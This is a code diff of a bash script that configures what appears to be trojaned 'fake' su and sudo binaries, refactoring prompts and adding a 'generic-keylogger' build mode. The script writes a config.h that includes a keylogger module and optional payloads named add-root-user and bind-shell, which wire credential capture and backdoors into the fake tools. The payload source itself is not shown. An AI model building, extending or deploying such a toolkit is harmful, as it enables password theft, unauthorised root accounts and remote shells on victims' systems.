@@ -3,13 +3,6 @@
 fun=(add-root-user bind-shell)
 programs=(su sudo)
 
-echo -e "\e[32m[+] configuring fake$1 ...\e[0m"
-
-if [[ -e config.h ]];then
-	read -p "config.h already exist, do you want to overwrite it? [y/N] " r
-	[[ "${r,}" != "y" ]] && exit;
-fi
-
 add_root_user()
 {
 	config+=("#define PWNFUNCTION add_root_user();")
@@ -52,32 +45,59 @@ keylogger()
 	config+=('#include "fun/keylogger.c"')
 }
 
-read -p "enable keylogger? [y/N] " r
-[[ "${r,}" == "y" ]] && keylogger
+ask_keylogger()
+{
+	read -p "enable keylogger? [y/N] " r
+	[[ "${r,}" == "y" ]] && keylogger
+}
 
-read -p "use some FUN modules? [y/N] " r
-if [[ "${r,}" == "y" ]];then
-	while :;do
-		for ((i = 1; i <= ${#fun[@]}; i++));do
-			echo "[$i] ${fun[i - 1]}"
+ask_fun()
+{
+	read -p "use some FUN modules? [y/N] " r
+	if [[ "${r,}" == "y" ]];then
+		while :;do
+			for ((i = 1; i <= ${#fun[@]}; i++));do
+				echo "[$i] ${fun[i - 1]}"
+			done
+
+			echo "[$i] cancel"
+			read -p "> " r
+
+			(( r == i )) && break;
+			if (( r < i && r > 0 ));then
+				config+=("#define CMDCHANGE")
+
+				# call the function
+				${fun[r - 1]//-/_}
+				break;
+			fi
 		done
+	fi
+}
 
-		echo "[$i] cancel"
-		read -p "> " r
+if [[ "$1" != "generic-keylogger" ]];then
+	name="fake$1"
+else
+	name="$1"
+fi
 
-		(( r == i )) && break;
-		if (( r < i && r > 0 ));then
-			config+=("#define CMDCHANGE")
+echo -e "\e[32m[+] configuring $name ...\e[0m"
 
-			# call the function
-			${fun[r - 1]//-/_}
-			break;
-		fi
-	done
+if [[ -e config.h ]];then
+	read -p "config.h already exist, do you want to overwrite it? [y/N] " r
+	[[ "${r,}" != "y" ]] && exit;
+fi
 
+
+if [[ "$name" != "generic-keylogger" ]];then
+	ask_keylogger
+	ask_fun
+else
+	keylogger
 fi
 
 echo -e "#ifndef __CONFIG_H__\n#define __CONFIG_H__\n" > config.h
+
 
 for i in "${config[@]}"
 do
